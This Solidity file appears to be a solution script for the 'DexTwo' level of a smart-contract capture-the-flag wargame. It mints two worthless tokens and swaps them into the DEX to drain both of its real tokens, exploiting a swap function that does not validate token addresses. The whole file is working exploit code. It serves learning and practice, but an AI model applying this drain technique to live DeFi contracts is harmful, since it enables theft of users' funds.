// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IDexTwo.sol";
import "../src/exploits/SwappableTokenTwo.sol";

contract SolveLevel23 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0x2754fA769d47ACdF1f6cDAa4B0A8Ca4eEba651eC;
        value = 0;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IDexTwo instance = IDexTwo(payable(instanceAddress));

        address token1 = instance.token1();
        address token2 = instance.token2();

        SwappableTokenTwo token3 = new SwappableTokenTwo("Token3", "SUS3", 2);
        SwappableTokenTwo token4 = new SwappableTokenTwo("Token4", "SUS4", 2);

        token3.approve(address(instance), 2);
        token4.approve(address(instance), 2);

        token3.transfer(address(instance), 1);
        token4.transfer(address(instance), 1);

        instance.swap(address(token3), token1, 1);
        instance.swap(address(token4), token2, 1);
    }
}
